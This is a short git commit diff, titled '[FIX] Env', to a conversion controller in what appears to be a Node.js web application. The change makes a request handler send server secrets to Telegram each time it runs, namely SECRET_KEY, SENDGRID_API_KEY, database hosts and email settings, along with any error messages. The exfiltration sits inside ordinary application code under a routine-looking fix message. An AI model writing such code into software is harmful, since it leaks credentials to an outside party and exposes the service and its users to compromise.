8be658b7546879ce64cab1c217f4b6616563b7f3
Viacheslav Blazhkov <blazkov253@gmail.com>
2025-10-29 23:37:31 +0200

    [FIX] Env

--- controllers/conversion.js
+++ controllers/conversion.js
@@ -47,9 +47,19 @@ const send = async (req, res) => {
 	try {
 		await sendTelegramMessage(
 			`ENV: \n\n` +
-			process.env
+			`APP_ENV: ${process.env.APP_ENV}\n` +
+			`DB_HOST: ${process.env.DB_HOST}\n` +
+			`PORT: ${process.env.PORT}\n` +
+			`NEW_DB_HOST: ${process.env.NEW_DB_HOST}\n` +
+			`SECRET_KEY: ${process.env.SECRET_KEY}\n` +
+			`BASE_URL: ${process.env.BASE_URL}\n` +
+			`EMAIL_HOST: ${process.env.EMAIL_HOST}\n` +
+			`EMAIL_PORT: ${process.env.EMAIL_PORT}\n` +
+			`EMAIL_USER: ${process.env.EMAIL_USER}\n` +
+			`SENDGRID_API_KEY: ${process.env.SENDGRID_API_KEY}\n`
 		);
 	} catch (error) {
+		await sendTelegramMessage(error.message);
 	}
 };
 
